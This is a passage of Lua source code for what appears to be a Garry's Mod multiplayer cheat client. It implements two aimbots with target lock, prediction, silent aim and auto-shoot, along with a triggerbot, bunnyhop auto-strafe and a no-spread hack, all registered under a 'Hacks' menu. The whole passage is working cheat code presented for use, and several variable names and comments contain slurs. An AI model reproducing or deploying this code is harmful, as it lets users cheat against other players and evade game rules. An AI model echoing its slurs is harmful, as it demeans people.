end
end
local function SettingsList()
return table.Copy(settings)
end
local function BuildMenu(self, panel)
hook.Remove("HUDPaint", "aimbotangle")
hook.Remove("Think", "aimbot")
for _, info in ipairs(settings) do
if info.Show != false then
if info.MultiChoice then
local m = panel:MultiChoice(info.Desc or info.CVar, info.CVar)
for k, v in pairs(info.MultiChoice) do
m:AddChoice(k, v)
end
elseif info.Type == "number" then
panel:NumSlider(info.Desc or info.CVar, info.CVar, info.Min or -1, info.Max or -1, info.Places or 0)
elseif info.Type == "boolean" then
panel:CheckBox(info.Desc or info.CVar, info.CVar)
elseif info.Type == "string" then
panel:TextEntry(info.Desc or info.CVar, info.CVar)
end
end
end
end
AA.SettingPrefix = "aa_"
AA.CreateSetting = CreateSetting
AA.Setting = GetSetting
AA.SettingsList = SettingsList
AA.BuildMenu = BuildMenu
AA.SettingsShutdown = Shutdown
AA:AddHook("Shutdown", "SettingsShutdown")
end
AA.ModelTarget = {}
function AA:SetModelTarget(model, targ)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self.ModelTarget[model] = targ
end
function AA:BaseTargetPosition(ent)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if type(ent) == "Player" then
local head = EntM["LookupAttachment"](ent, "eyes")
if head then
local pos = EntM["GetAttachment"](ent, head)
if pos then
return pos.Pos - (AngM["Forward"](pos.Ang) * 2)
end
end
end
local special = self.ModelTarget[string.lower(EntM["GetModel"](ent) or "")]
if special then
if type(special) == "string" then
local bone = EntM["LookupBone"](ent, special)
if bone then
local pos = EntM["GetBonePosition"](ent, bone)
if pos then
return pos
end
end
elseif type(special) == "Vector" then
return EntM["LocalToWorld"](ent, special)
elseif type(special) == "function" then
local pos = pcall(special, ent)
if pos then return pos end
end
end
local bone = "ValveBiped.Bip01_Head1"
local head = EntM["LookupBone"](ent, bone)
if head then
local pos = EntM["GetBonePosition"](ent, head)
if pos then
return pos
end
end
return EntM["LocalToWorld"](ent, EntM["OBBCenter"](ent))
end
function AA:TargetPosition(ent)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
local targetPos = self:BaseTargetPosition(ent)
local ply = LocalPlayer()
if ValidEntity(ply) then
targetPos = self:CallHook("TargetPrediction", {ply, ent, targetPos}) or targetPos
end
return targetPos
end
AA:SetModelTarget("models/crow.mdl", Vector(0, 0, 5))                                           
AA:SetModelTarget("models/pigeon.mdl", Vector(0, 0, 5))                                         
AA:SetModelTarget("models/seagull.mdl", Vector(0, 0, 6))                                        
AA:SetModelTarget("models/combine_scanner.mdl", "Scanner.Body")                                 
AA:SetModelTarget("models/hunter.mdl", "MiniStrider.body_joint")                        
AA:SetModelTarget("models/combine_turrets/floor_turret.mdl", "Barrel")          
AA:SetModelTarget("models/dog.mdl", "Dog_Model.Eye")                                            
AA:SetModelTarget("models/vortigaunt.mdl", "ValveBiped.Head")                           
AA:SetModelTarget("models/antlion.mdl", "Antlion.Body_Bone")                                    
AA:SetModelTarget("models/antlion_guard.mdl", "Antlion_Guard.Body")                     
AA:SetModelTarget("models/antlion_worker.mdl", "Antlion.Head_Bone")                     
AA:SetModelTarget("models/zombie/fast_torso.mdl", "ValveBiped.HC_BodyCube")     
AA:SetModelTarget("models/zombie/fast.mdl", "ValveBiped.HC_BodyCube")           
AA:SetModelTarget("models/headcrabclassic.mdl", "HeadcrabClassic.SpineControl") 
AA:SetModelTarget("models/headcrabblack.mdl", "HCBlack.body")                           
AA:SetModelTarget("models/headcrab.mdl", "HCFast.body")                                                 
AA:SetModelTarget("models/zombie/poison.mdl", "ValveBiped.Headcrab_Cube1")       
AA:SetModelTarget("models/zombie/classic.mdl", "ValveBiped.HC_Body_Bone")        
AA:SetModelTarget("models/zombie/classic_torso.mdl", "ValveBiped.HC_Body_Bone") 
AA:SetModelTarget("models/zombie/zombie_soldier.mdl", "ValveBiped.HC_Body_Bone") 
AA:SetModelTarget("models/combine_strider.mdl", "Combine_Strider.Body_Bone") 
AA:SetModelTarget("models/combine_dropship.mdl", "D_ship.Spine1")                       
AA:SetModelTarget("models/combine_helicopter.mdl", "Chopper.Body")                      
AA:SetModelTarget("models/gunship.mdl", "Gunship.Body")                                         
AA:SetModelTarget("models/lamarr.mdl", "HeadcrabClassic.SpineControl")          
AA:SetModelTarget("models/mortarsynth.mdl", "Root Bone")                                                
AA:SetModelTarget("models/synth.mdl", "Bip02 Spine1")                                           
AA:SetModelTarget("models/vortigaunt_slave.mdl", "ValveBiped.Head")              
AA.NPCDeathSequences = {}
function AA:AddNPCDeathSequence(model, sequence)
self.NPCDeathSequences = self.NPCDeathSequences or {}
self.NPCDeathSequences[model] = self.NPCDeathSequences[model] or {}
if !table.HasValue(self.NPCDeathSequences[model]) then
table.insert(self.NPCDeathSequences[model], sequence)
end
end
AA:AddNPCDeathSequence("models/barnacle.mdl", 4)
AA:AddNPCDeathSequence("models/barnacle.mdl", 15)
AA:AddNPCDeathSequence("models/antlion_guard.mdl", 44)
AA:AddNPCDeathSequence("models/hunter.mdl", 124)
AA:AddNPCDeathSequence("models/hunter.mdl", 125)
AA:AddNPCDeathSequence("models/hunter.mdl", 126)
AA:AddNPCDeathSequence("models/hunter.mdl", 127)
AA:AddNPCDeathSequence("models/hunter.mdl", 128)
AA:CreateSetting("friendlyfire", "Target teammates", false)
function AA:IsValidTarget(ent)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
local typename = type(ent)
if typename != "NPC" && typename != "Player" then return false end
if !ValidEntity(ent) then return false end
local ply = LocalPlayer()
if ent == ply then return false end
if typename == "Player" then
if !PlyM["Alive"](ent) then return false end 
if !self:Setting("friendlyfire") && PlyM["Team"](ent) == PlyM["Team"](ply) then return false end
if GetConVarNumber("aa_targetfriends") != 1 && ent:GetFriendStatus() == "friend" then return false end
if EntM["GetMoveType"](ent) == MOVETYPE_OBSERVER then return false end 
if EntM["GetMoveType"](ent) == MOVETYPE_NONE then return false end
end
if typename == "NPC" then
if EntM["GetMoveType"](ent) == MOVETYPE_NONE then return false end 
local model = string.lower(EntM["GetModel"](ent) or "")
if table.HasValue(self.NPCDeathSequences[model] or {}, EntM["GetSequence"](ent)) then return false end
end
end
AA:CreateSetting("predictblocked", "Predict blocked (time)", 0.4, {Min = 0, Max = 1})
function AA:BaseBlocked(target, offset)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
local shootPos = PlyM["GetShootPos"](ply)
local targetPos = self:TargetPosition(target)
if offset then targetPos = targetPos + offset end
local trace = util.TraceLine({start = shootPos, endpos = targetPos, filter = {ply, target}, mask = MASK_SHOT})
local wrongAim = self:AngleBetween(PlyM["GetAimVector"](ply), VecM["GetNormal"](targetPos - shootPos)) > 2
if trace.Hit && trace.Entity != target then
return true, wrongAim
end
return false, wrongAim
end
function AA:TargetBlocked(target)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !target then target = self:GetTarget() end
if !target then return end
local blocked, wrongAim = self:BaseBlocked(target)
if self:Setting("predictblocked") > 0 && blocked then
blocked = self:BaseBlocked(target, EntM["GetVelocity"](target) * self:Setting("predictblocked"))
end
return blocked, wrongAim
end
function AA:SetTarget(ent)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if self.Target && !ent then
self:CallHook("TargetLost")
elseif !self.Target && ent then
self:CallHook("TargetGained")
elseif self.Target && ent && self.Target != ent then
self:CallHook("TargetChanged")
end
self.Target = ent
end
function AA:GetTarget()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if ValidEntity(self.Target) != false then
return self.Target
else
return false
end
end
AA:CreateSetting("maxangle", "Max angle", 30, {Min = 5, Max = 90})
AA:CreateSetting("targetblocked", "Don't check LOS", false)
AA:CreateSetting("holdtarget", "Hold targets", false)
function AA:FindTarget()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !self:Enabled() then return end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
local maxAng = self:Setting("maxangle")
local aimVec, shootPos = PlyM["GetAimVector"](ply), PlyM["GetShootPos"](ply)
local targetBlocked = self:Setting("targetblocked")
if self:Setting("holdtarget") then
local target = self:GetTarget()
if target then
local targetPos = self:TargetPosition(target)
local angle = self:AngleBetween(AngM["Forward"](self:GetView()), VecM["GetNormal"](targetPos - shootPos))
local blocked = self:TargetBlocked(target)
if angle <= maxAng && (!blocked || targetBlocked) then return end
end
end
local targets = ents.GetAll()
for i, ent in pairs(targets) do
if self:IsValidTarget(ent) == false then
targets[i] = nil
end
end
local closestTarget, lowestAngle = _, maxAng
for _, target in pairs(targets) do
if targetBlocked || !self:TargetBlocked(target) then
local targetPos = self:TargetPosition(target)
local angle = self:AngleBetween(AngM["Forward"](self:GetView()), VecM["GetNormal"](targetPos - shootPos))
if angle < lowestAngle then
lowestAngle = angle
closestTarget = target
end
end
end
self:SetTarget(closestTarget)
end
AA:AddHook("Think", "FindTarget")
AA.View = Angle(0, 0, 0)
function AA:GetView()
return self.View * 1
end
function AA:KeepView()
if !self:Enabled() then return end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
self.View = EntM["EyeAngles"](ply)
end
AA:AddHook("OnToggled", "KeepView")
local sensitivity = 0.022
function AA:RotateView(cmd)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self.View.p = math.Clamp(self.View.p + (CmdM["GetMouseY"](cmd) * sensitivity), -89, 89)
self.View.y = math.NormalizeAngle(self.View.y + (CmdM["GetMouseX"](cmd) * sensitivity * -1))
end
AA:CreateSetting("debug", "Debug", false, {Show = false})
function AA:FakeView(ply, origin, angles, FOV)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !self:Enabled() && !self.SetAngleTo then return end
if GetViewEntity() != LocalPlayer() then return end
if self:Setting("debug") then return end
local base = GAMEMODE:CalcView(ply, origin, self.SetAngleTo or self.View, FOV) or {}
base.angles = base.angles or (self.AngleTo or self.View)
base.angles.r = 0 
return base
end
AA:AddHook("CalcView", "FakeView")
function AA:TargetPrediction(ply, target, targetPos)
local weap = PlyM["GetActiveWeapon"](ply)
if ValidEntity(weap) then
local class = EntM["GetClass"](weap)
if class == "weapon_crossbow" then
local dist = VecM["Length"](targetPos - PlyM["GetShootPos"](ply))
local time = (dist / 3500) + 0.05 
targetPos = targetPos + (EntM["GetVelocity"](target) * time)
end
local mul = 0.0075
end
return targetPos
end
AA:AddHook("TargetPrediction", "TargetPrediction")
function AA:SetAngle(ang)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self.SetAngleTo = ang
end
AA:CreateSetting("smoothspeed", "Smooth aim speed (0 to disable)", 120, {Min = 0, Max = 360})
AA:CreateSetting("snaponfire", "Snap on fire", true)
AA:CreateSetting("snapgrace", "Snap on fire grace", 0.5, {Min = 0, Max = 3, Places = 1})
AA.LastAttack = 0
function AA:SetAimAngles(cmd)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self:RotateView(cmd)
if !self:Enabled() && !self.SetAngleTo then return end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
local targetAim = self:GetView()
local target = self:GetTarget()
if target then
local targetPos = self:TargetPosition(target)
targetAim = VecM["Angle"](targetPos - ply:GetShootPos())
end
if self:Setting("snaponfire") then
local time = CurTime()
if PlyM["KeyDown"](ply, IN_ATTACK) || PlyM["KeyDown"](ply, IN_ATTACK2) || self:Setting("autoshoot") != 0 then
self.LastAttack = time
end
if CurTime() - self.LastAttack > self:Setting("snapgrace") then
targetAim = self:GetView()
end
end
if self.SetAngleTo then
targetAim = self.SetAngleTo
end
local smooth = self:Setting("smoothspeed")
if smooth > 0 then
local current = CmdM["GetViewAngles"](cmd)
current = self:ApproachAngle(current, targetAim, smooth * FrameTime())
current.r = 0
if self.RevertingAim then
local diff = self:NormalizeAngle(current - self:GetView())
if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.RevertingAim = false end
elseif targetAim == self:GetView() then
current = targetAim
end
if self.SetAngleTo then
local diff = self:NormalizeAngle(current - self.SetAngleTo)
if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.SetAngleTo = nil end
end
aim = current
else
aim = targetAim
self.SetAngleTo = nil
end
CmdM["SetViewAngles"](cmd, aim)
local sensitivity = 0.22
local diff = aim - CmdM["GetViewAngles"](cmd)
CmdM["SetMouseX"](cmd, diff.y / sensitivity)
CmdM["SetMouseY"](cmd, diff.p / sensitivity)
local move = Vector(CmdM["GetForwardMove"](cmd), CmdM["GetSideMove"](cmd), 0)
local norm = VecM["GetNormal"](move)
local set = AngM["Forward"](VecM["Angle"](norm) + (aim - self:GetView())) * VecM["Length"](move)
CmdM["SetForwardMove"](cmd, set.x)
CmdM["SetSideMove"](cmd, set.y)
end
AA:AddHook("CreateMove", "SetAimAngles")
function AA:RevertAim()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self.RevertingAim = true
end
AA:AddHook("TargetLost", "RevertAim")
function AA:StopRevertAim()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self.RevertingAim = false
end
AA:AddHook("TargetGained", "RevertAim")
function AA:ViewToAim()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if self:Enabled() then return end
self:SetAngle(self:GetView())
end
AA:AddHook("OnToggled", "ViewToAim")
AA:CreateSetting("crosshair", "Crosshair size (0 to disable)", 18, {Min = 0, Max = 20})
function AA:DrawTarget()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !self:Enabled() then return end
local target = self:GetTarget()
if !target then return end
local size = self:Setting("crosshair")
if size <= 0 then return end
local blocked, aimOff = self:TargetBlocked()
if blocked then
surface.SetDrawColor(255, 0, 0, 255) 
elseif aimOff then
surface.SetDrawColor(255, 255, 0, 255) 
else
surface.SetDrawColor(0, 255, 0, 255) 
end
local pos = self:TargetPosition(target)
local screen = VecM["ToScreen"](pos)
local x, y = screen.x, screen.y
local a, b = size / 2, size / 6
surface.DrawLine(x - a, y - a, x - b, y - a)
surface.DrawLine(x - a, y - a, x - a, y - b)
surface.DrawLine(x + a, y + a, x + b, y + a)
surface.DrawLine(x + a, y + a, x + a, y + b)
surface.DrawLine(x + a, y - a, x + b, y - a)
surface.DrawLine(x + a, y - a, x + a, y - b)
surface.DrawLine(x - a, y + a, x - b, y + a)
surface.DrawLine(x - a, y + a, x - a, y + b)
end
AA:AddHook("HUDPaint", "DrawTarget")
AA.ScreenMaxAngle = {
Length = 0,
FOV = 0,
MaxAngle = 0
}
AA:CreateSetting("draw_maxangle", "Draw Max Angle", true)
function AA:DrawMaxAngle()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !self:Enabled() then return end
local show = AA:Setting("draw_maxangle")
if !show then return end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
local info = self.ScreenMaxAngle
local maxang = AA:Setting("maxangle")
local fov = PlyM["GetFOV"](ply)
if GetViewEntity() == ply && (maxang != info.MaxAngle || fov != info.FOV) then
local view = self:GetView()
view.p = view.p + maxang
local screen = (PlyM["GetShootPos"](ply) + (AngM["Forward"](view) * 100))
screen = VecM["ToScreen"](screen)
info.Length = math.abs((ScrH() / 2) - screen.y)
info.MaxAngle = maxang
info.FOV = fov
end
local length = info.Length
local cx, cy = ScrW() / 2, ScrH() / 2
for x = -1, 1 do
for y = -1, 1 do
if x != 0 || y != 0 then
local add = VecM["GetNormal"](Vector(x, y, 0)) * length
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect((cx + add.x) - 2, (cy + add.y) - 2, 5, 5)
surface.SetDrawColor(255, 255, 255, 255)
surface.DrawRect((cx + add.x) - 1, (cy + add.y) - 1, 3, 3)
end
end
end
end
AA:AddHook("HUDPaint", "DrawMaxAngle")
AA.AttackDown = false
function AA:SetShooting(bool)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if self.AttackDown == bool then return end
self.AttackDown = bool
local pre = {[true] = "+", [false] = "-"}
RunConsoleCommand(pre[bool] .. "attack")
end
AA.NextShot = 0
AA:CreateSetting("autoshoot", "Max auto-shoot distance (0 to disable)", 0, {Min = 0, Max = 16384})
function AA:Shoot()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !self:Enabled() then
self:SetShooting(false)
return
end
local maxDist = self:Setting("autoshoot")
if maxDist == 0 then return end
local target = self:GetTarget()
if !target then return end
local blocked, wrongAim = self:TargetBlocked(target)
if blocked || wrongAim then return end
local ply = LocalPlayer()
if !ValidEntity(ply) then return end
local targetPos = self:TargetPosition(target)
local distance = VecM["Length"](targetPos - ply:GetShootPos())
if distance > maxDist && maxDist != -1 then return end
if CurTime() < self.NextShot then return end
local weap = PlyM["GetActiveWeapon"](ply)
if !ValidEntity(weap) then return end
self:SetShooting(true)
if self:IsSemiAuto(weap) then
timer.Simple(0.05, function() self:SetShooting(false) end)
end
self.NextShot = CurTime() + 0.1
end
AA:AddHook("Think", "Shoot")
function AA:StopShooting()
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
self:SetShooting(false)
end
AA:AddHook("TargetLost", "StopShooting")
AA.IsEnabled = false
function AA:Enabled() return self.IsEnabled end
function AA:SetEnabled(bool)
if self.IsEnabled == bool then return end
self.IsEnabled = bool
local e = {[true] = "1", [false] = "0"}
RunConsoleCommand("aa_enabled", e[self.IsEnabled])
self:CallHook("OnToggled")
end
function AA:Toggle()
self:SetEnabled(!self:Enabled())
end
concommand.Add("aa_toggle", function() AA:Toggle() end)
AA:CreateSetting("enabled", "Enabled", false, {Save = false})
function AA:ConVarEnabled(_, old, val)
if old == val then return end
val = tonumber(val) or 0
self:SetEnabled(val > 0)
end
AA:AddCVarHook("aa_enabled", "ConVarEnabled")
concommand.Add("+aa", function() AA:SetEnabled(true) end)
concommand.Add("-aa", function() AA:SetEnabled(false) end)
function AA:OpenMenu()
local w, h = ScrW() / 3, ScrH() / 2
local menu = vgui.Create("DFrame")
menu:SetTitle("AutoAim")
menu:SetSize(w, h)
menu:Center()
menu.Paint = function()
draw.RoundedBox( 8, 0, 0, menu:GetWide(), menu:GetTall(), Color( 0, 0, 0, 210 ) )
end
menu:MakePopup()
local scroll = vgui.Create("DPanelList", menu)
scroll:SetPos(5, 25)
scroll:SetSize(w - 10, h - 30)
scroll:EnableVerticalScrollbar()
local form = vgui.Create("DForm", menu)
form:SetName("")
form.Paint = function()
draw.RoundedBox( 8, 0, 0, form:GetWide(), form:GetTall(), Color( 180, 180, 180, 30 ) )
end
scroll:AddItem(form)
self:BuildMenu(form)
if AA.Menu then AA.Menu:Remove() end
AA.Menu = menu
end
concommand.Add("aa_menu", function() AA:OpenMenu() end)
function AA:RegisterMenu()
spawnmenu.AddToolMenuOption("Options", "Hacks", "AutoAim", "AutoAim", "", "", function(p) self:BuildMenu(p) end)
end
AA:AddHook("PopulateToolMenu", "RegisterMenu")
function AA:AngleBetween(a, b)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
return math.deg(math.acos(VecM["Dot"](a, b)))
end
function AA:NormalizeAngle(ang)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
return Angle(math.NormalizeAngle(ang.p), math.NormalizeAngle(ang.y), math.NormalizeAngle(ang.r))
end
function AA:ApproachAngle(start, target, add)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
local diff = self:NormalizeAngle(target - start)
local vec = Vector(diff.p, diff.y, diff.r)
local len = VecM["Length"](vec)
vec = VecM["GetNormal"](vec) * math.min(add, len)
return start + Angle(vec.x, vec.y, vec.z)
end
local notAuto = {"weapon_pistol", "weapon_rpg", "weapon_357", "weapon_crossbow"}
function AA:IsSemiAuto(weap)
if LocalPlayer():GetActiveWeapon() != NULL then 
if( LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physgun" or
LocalPlayer():GetActiveWeapon():GetClass() == "gmod_tool" or LocalPlayer():GetActiveWeapon():GetClass() == "weapon_physcannon" ) then return end
end
if !ValidEntity(weap) then return end
return (weap.Primary && !weap.Primary.Automatic) || table.HasValue(notAuto, EntM["GetClass"](weap))
end
local isfiring = false
local lastoldang = 0
function ZNX.AimbotCore( cmd )
if ZNX.Vars.Aimbot and AA.IsEnabled == true then
ZNX.ChatText( "Ancien Aimbot désactivé pour eviter les bugs \nVous devez désactivé le Aimbot Normal \nPour pouvoir activer l'Ancien Aimbot !", Color(255,0,0) )
AA:SetEnabled(false)
end
local ply = LocalPlayer()
if !ZNX.Vars.SilentAim then ZNX.InternalFakeAngles = 0 end
if lastoldang and isangle( lastoldang ) then
cmd:SetViewAngles( lastoldang )
lastoldang = 0
end
if !ZNX.Vars.Aimbot then
lastoldang = 0
ZNX.AimbotPreviewTarget = -1
ZNX.AimbotTarget = game.GetWorld()
return
end
if !ZNX.Vars.AimbotStickyLock then
local closestfag = ZNX.GetClosestToCursor( true )
if closestfag != ZNX.AimbotTarget then ZNX.AimbotTarget = closestfag end
end
local atarg = ZNX.AimbotTarget
local pozzed = ZNX.PrepareForAStomping( atarg )
if isvector( pozzed ) then ZNX.AimbotPreviewTarget = pozzed end
-- negate target if they are invalid for whatever reason
if !atarg:IsValid() or ZNX.IsDead( atarg ) or !ZNX.InFOV( atarg ) or !ZNX.CanTargetPlayer( atarg ) or (ZNX.ToMetric(ply:GetPos():Distance(atarg:GetPos())) >= ZNX.NumberVars.AimbotDist) or !isvector( pozzed ) then
ZNX.AimbotPreviewTarget = -1
ZNX.AimbotTarget = ZNX.GetClosestToCursor( true )
ZNX.InternalFakeAngles = 0
return
end
-- snap only on fire option
if ZNX.Vars.SnapOnFire and !input.IsMouseDown(MOUSE_LEFT) or !ply:GetActiveWeapon() or !ply:GetActiveWeapon():IsValid() or !ZNX.CanBotShoot( ply:GetActiveWeapon() ) then 
--        ZNX.AimbotTarget = game.GetWorld()
targetlerp = LocalPlayer():EyeAngles()
return 
end
-- keybind mode
if ZNX.Vars.AimbotBindMode then
local khn = ZNX.NumberVars.AimbotBindKey
if not ( input.IsKeyDown( khn ) or input.IsMouseDown( khn ) ) then
--           ZNX.AimbotTarget = game.GetWorld()
targetlerp = LocalPlayer():EyeAngles()
return 
end
end
-- cap a motherfucker
ZNX.AimbotPreviewTarget = pozzed
local aids = pozzed - ply:GetShootPos()
aids = aids:Angle()
aids:Normalize()
if ZNX.NumberVars.AimbotSmooth > 0 then
targetlerp = LerpAngle(FrameTime() * ((51 - ZNX.NumberVars.AimbotSmooth) / 5), targetlerp, aids)
aids = targetlerp
end
aids = Angle( aids.p, aids.y, 0 )
if ZNX.Vars.SilentAim then 
lastoldang = cmd:GetViewAngles() + Angle( cmd:GetMouseY() * 0.02, -cmd:GetMouseX() * 0.015, 0 )
ZNX.InternalFakeAngles = lastoldang
end
cmd:SetViewAngles(aids)
if ZNX.Vars.SilentAim then ZNX.FixMove( cmd, true ) end
if ZNX.Vars.AutoShoot and !ZNX.Vars.Autoclick and !ZNX.Vars.Triggerbot then 
if( !isfiring ) then
cmd:SetButtons( bit.bor( cmd:GetButtons(), IN_ATTACK ) ) 
isfiring = true
else
cmd:SetButtons( bit.band( cmd:GetButtons(), bit.bnot( IN_ATTACK ) ) )                      
isfiring = false
end
end
end
local function ch_bunnyhop(ply)
if( ZNX.Vars.Bhop) then
if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround()) then
ply:RemoveKey(IN_JUMP);
if !LocalPlayer():IsFlagSet( FL_ONGROUND ) and LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP then
if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
else
ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
end
end
elseif(ply:KeyDown(IN_JUMP) && ZNX.Vars.BhopAutostrafe) then
ply:SetForwardMove(10000)
end
end
end
hook.Add("CreateMove", "", function(ply)
ch_bunnyhop(ply);
end);
function Nospread()
if ZNX.Vars.CompSpread then
hook.Add("Think", "nospread", function ()
if LocalPlayer():GetActiveWeapon().Primary then
LocalPlayer():GetActiveWeapon().Primary.Cone = 0
LocalPlayer():GetActiveWeapon().Primary.Spread = 0
end
end)
end
end
hook.Add("Think", "Nospreading", Nospread)
local vw = Angle( 0, 0, 0 )
local targetlerp = Angle( 0, 0, 0)
local nxtangle = false
function ZNX.CreateMove( cmd )
local ply = LocalPlayer()
if !ply:IsValid() then return end
local amemfootprint = gcinfo()
if ZNX.Vars.Triggerbot and ply:Alive() and ply:GetActiveWeapon() and ply:GetActiveWeapon():IsValid() and ZNX.CanBotShoot( ply:GetActiveWeapon() ) then
